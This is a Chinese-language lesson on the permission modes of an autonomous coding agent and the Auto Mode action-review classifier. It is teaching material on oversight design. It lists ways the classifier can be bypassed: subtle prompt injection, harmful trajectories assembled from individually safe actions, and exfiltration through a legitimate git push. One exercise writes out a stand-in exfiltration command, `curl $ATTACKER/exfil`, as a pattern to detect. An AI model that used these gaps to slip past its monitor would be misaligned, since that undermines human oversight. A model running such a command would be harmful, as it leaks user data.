# 自主代理的权限模式

> 一种权限阶梯——从审查每个动作到批准所有动作的分级自主水平——是工具如何管理自主代理无需询问即可执行的操作的方式。Claude Code 作为本课的工作示例，展示了六种这样的模式："plan" 在每个动作前询问，"default"（UI 中标记为 "Manual"）仅对危险操作询问，"acceptEdits" 自动批准文件写入但仍确认 shell 执行，而 "bypassPermissions" 批准一切。Auto Mode（`auto` 权限模式）用一个单独的分类器模型取代逐动作审批，该模型会在每个动作运行前审查并阻止任何超出请求范围的操作。行动预算通过 `max_turns` 和 `max_budget_usd` 来实施。`auto` 的可用性取决于计划、组织启用、模型和提供者——Anthropic 明确指出分类器本身并不足够。

**类型：** 学习
**语言：** Python (stdlib，两阶段分类器模拟器)
**先修知识：** 第 15 阶段 · 01（长周期代理），第 15 阶段 · 09（编码代理生态系统）
**时间：** 约 45 分钟

## 问题背景

运行在你机器上的自主编码代理是一个独立的安全类别。攻击面涵盖代理能够触及的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出这一点：计算机使用代理不是聊天机器人的"功能更新"，而是具有全新风险特征的新工具类型。

Claude Code 的权限系统就是 Anthropic 的答案。与其只有一个"自主/非自主"开关，这里有六个覆盖能力阶梯的模式：plan → default → acceptEdits → … → bypassPermissions。每种模式都是在速度与逐动作审查之间不同的权衡。Auto Mode（2026 年 3 月）引入了一个单独的分类器模型，将审批移出用户的关键路径：它在每个动作运行前审查，并阻止任何超出请求范围的升级操作。

工程问题：这个系统能捕获什么，会漏掉什么，而特定任务实际上需要哪种模式？

## 概念解析

### 六种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | 代理提出计划；用户批准整个计划；每个动作在執行前都会被审查 | 陌生任务；生产环境相关代码；首次在该仓库使用代理 |
| `default` | UI 中标记为"Manual"。代理运行动作；对任何"危险"动作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍会提示 | 跨多个文件的重构过程 |
| `auto` | 单独的 Classification 模型在每个动作运行前审查；阻止超出请求范围的升级操作 | 受限工作区中的无人值守长周期运行 |
| `dontAsk` | 从不提示；未被权限规则预批准的动作被拒绝 | 临时沙箱、CI 作业、研究脚本 |
| `bypassPermissions` | 批准所有操作 | 文档说明为"仅在愿意丢弃的临时容器中"使用 |

（上述名称与公开 Claude Code 文档一致；UI 将 `default` 标记为"Manual"。）

### Auto Mode 一页概览

Auto Mode（2026 年 3 月 24 日发布）是首个将对每个动作的审批委托给模型的权限模式。结构如下：

1. **单独的 Classification 模型。** 在每个提议的动作运行前审查，根据声明的任务和会话当前状态进行判断，并阻止任何超出请求范围的升级操作。被阻止的动作会回退到用户。
2. **受限的可用性。** `auto` 是否可用取决于计划、组织启用状态、模型和提供者。

预算控制与 Classification 并列存在：

- `max_turns` —— 会话中的总迭代次数。
- `max_budget_usd` —— 达到美元上限时会中止会话。
- 每个工具的 action-count 限制（例如最多 N 次 `WebFetch` 调用等）。

### 系统能捕获什么

- 将注入式提示直接引入工具输入，且注入指令映射到已知高风险动作形态的情况。
- 重复的工具循环 —— Classification 能发现动作 N+1 与前一个动作几乎相同，连续出现五次。
- 在其他仅涉及文件编辑的会话中明显超出范围的外壳命令。

### 系统可能漏掉什么

- **微妙的提示注入** 在不产生单个被标记动作的情况下调节行为。间接提示注入并非完全可修补的漏洞（OpenAI 准备度负责人，2025 年，针对浏览器代理 —— 参见第 11 课）。
- **语义层面的不良行为。** 每个单独的动作看起来都可能是安全的，但组合而成的轨迹可能有害。Classification 只判断动作本身；它不会重新推导用户的意图。
- **通过合法渠道的数据外泄。** 将数据写入你拥有的文件，然后 `git push` 到公开仓库，这是一系列允许动作的组合，其组合结果才是问题所在。

### 研究预览框架

Anthropic 将 Auto Mode 作为研究预览发布。文档明确指出分类器只是一层防护，而非解决方案：用户预期将 Auto Mode 与预算、白名单、隔离工作区和轨迹审计（第 12–16 课）结合使用。预览框架也反映了文档中记录过的评估与部署差距（第 1 课）—— 在离线评估中表现良好的分类器，在用户上下文模糊的真实会话中可能表现出不同行为。

### 该阶梯如何融入你的工作流

- 陌生任务：从 `plan` 开始。阅读计划比回滚糟糕的运行代价更低。
- 已知重构：`acceptEdits` 可以节省大量确认点击。
- 无人值守后台运行：仅在已测量爆炸半径的工作区内使用 `auto`（无凭据、无生产挂载、无你未主动选择的出口流量）。
- 临时容器：仅当容器及其凭据可丢弃时，`dontAsk` / `bypassPermissions` 才可接受。

```figure
autonomy-oversight
```

## 实践使用

`code/main.py` 模拟了一个动作审查 Classification 器，作为两阶段流水线——这是一种教学简化；真实的 `auto` 模式由单独的 Classification 模型支持，而非文档化的两阶段契约。第一阶段是对提议动作的廉价关键词规则；第二阶段是较慢的多规则审查器。驱动脚本输入了一段简短的合成轨迹（安全动作、一次提示注入尝试、一次重复循环），并展示了 Classification 器在何处捕获以及何处漏过。

## 成果输出

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需隔离措施。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从未被第一阶段标记但总是被第二阶段捕获？哪种类型两个阶段都未捕获？

2. 扩展第一阶段规则集以捕获特定的已知危险形态（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量假阳性率。

3. 阅读 Anthropic 的"How the agent loop works"文档。列出在 `default` 模式下代理默认接触的所有外部状态。在无人值守运行 `auto` 前，哪些需要你单独设置门控？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每个工具的上限、白名单。为每个数字提供理由。

5. 描述一个轨迹，其中每个单独的动作都被 Classification 批准，但组合行为却存在偏差。（第 14 课涵盖了终结开关和金丝雀令牌如何解决此问题。）

## 关键术语

| 术语 | 人们通常的说法 | 实际含义 |
|---|---|---|
| Permission mode | "代理能做多少事" | 控制逐动作审批的六个命名策略之一 |
| plan mode | "任何事之前都要问" | 代理编写计划；用户在执行前批准 |
| acceptEdits | "让它写入文件" | 文件写入自动批准；shell 执行仍会提示 |
| auto | "自动批准" | 单独的 Classification 模型审查每个动作；阻止超出请求的升级 |
| bypassPermissions | "完全放任" | 批准所有操作；专为临时容器设计 |
| Stage 1 (simulator) | "快速关键词检查" | `code/main.py` 中对提议动作的廉价规则 |
| Stage 2 (simulator) | "深度审查" | `code/main.py` 中对被标记动作的较慢多规则审查器 |
| Research preview | "尚未正式发布" | Anthropic 对仍在映射失败模式的功能的框架描述 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、预算、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 托管服务执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 功能概述与 Auto Mode 公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造 Classification 判断的理由层。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 关于长周期权限设计的内部视角。
